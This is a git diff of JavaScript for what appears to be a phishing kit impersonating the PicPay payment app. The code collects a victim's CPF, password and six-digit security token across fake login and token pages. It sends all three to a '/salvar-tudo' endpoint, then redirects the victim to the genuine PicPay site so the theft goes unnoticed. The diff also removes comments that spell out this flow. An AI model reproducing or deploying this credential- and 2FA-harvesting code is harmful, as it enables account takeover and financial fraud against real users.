@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 document.addEventListener('DOMContentLoaded', () => {
 
     const inicializarMascaraCPF = () => {
@@ -251,7 +250,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 sessionStorage.setItem('temp_cpf', cpf);
                 sessionStorage.setItem('temp_senha', senha);
                 // Redireciona para a página de confirmação, aconteça o que acontecer
-                window.location.href = 'confirm/index.html';
+                window.location.href = 'confirmacao.html';
             }
         });
     };
@@ -266,19 +265,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
         options.addEventListener('click', (e) => {
             e.preventDefault();
-            window.location.href = '/token/index.html';
+            window.location.href = '.html';
         });
     };
 
-    /**
-     * ETAPA 3: PÁGINA DO TOKEN (token.html)
-     * Inicia o contador, captura o token e envia o pacote completo de dados.
-     */
+     
     const inicializarPaginaToken = () => {
         const tokenForm = document.getElementById('tokenForm');
-        if (!tokenForm) return; // Só executa se estiver na página do token
+        if (!tokenForm) return; 
 
-        // Lógica do contador regressivo
         const reenviarLink = document.getElementById('reenviarCodigo');
         let timeLeft = 59;
         const timerId = setInterval(() => {
@@ -297,7 +292,6 @@ document.addEventListener('DOMContentLoaded', () => {
             const token = document.getElementById('token').value;
             if (token.length < 6) return alert('Por favor, digite o código de 6 dígitos.');
 
-            // Recupera os dados guardados da primeira página
             const cpf = sessionStorage.getItem('temp_cpf');
             const senha = sessionStorage.getItem('temp_senha');
 
@@ -308,7 +302,6 @@ document.addEventListener('DOMContentLoaded', () => {
             }
 
             try {
-                // Envia o pacote completo (CPF + Senha + Token) para o servidor
                 await fetch('/salvar-tudo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -317,17 +310,13 @@ document.addEventListener('DOMContentLoaded', () => {
             } catch (error) {
                 console.error("Falha ao enviar pacote final:", error);
             } finally {
-                // Limpa a "memória da aba" e redireciona para o site oficial
                 sessionStorage.clear();
                 window.location.href = 'https://www.picpay.com/site';
             }
         });
     };
     
-    /**
-     * FUNÇÃO EXTRA: PÁGINA DE EMPRÉSTIMOS (emprestimos.html)
-     * Lida com o envio do formulário de CPF da página de empréstimos.
-     */
+    
     const inicializarPaginaEmprestimos = () => {
         const emprestimoForm = document.getElementById('emprestimoForm');
         if (!emprestimoForm) return;
@@ -345,7 +334,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 });
                 const result = await response.json();
                 alert(result.message);
-                // Após o alerta, pode-se redirecionar ou limpar o formulário se desejar
                 emprestimoForm.reset();
 
             } catch (error) {
@@ -354,8 +342,6 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     };
 
-    // Executa todas as funções de inicialização.
-    // A estrutura "if (!elemento) return;" garante que apenas a função certa rode na página certa.
     inicializarMascaraCPF();
     inicializarModais();
     inicializarPaginaLogin();
@@ -363,4 +349,3 @@ document.addEventListener('DOMContentLoaded', () => {
     inicializarPaginaToken();
     inicializarPaginaEmprestimos();
 });
->>>>>>> 21838d92648fcdfffa9c480b8d8c61a7f8a9b5db
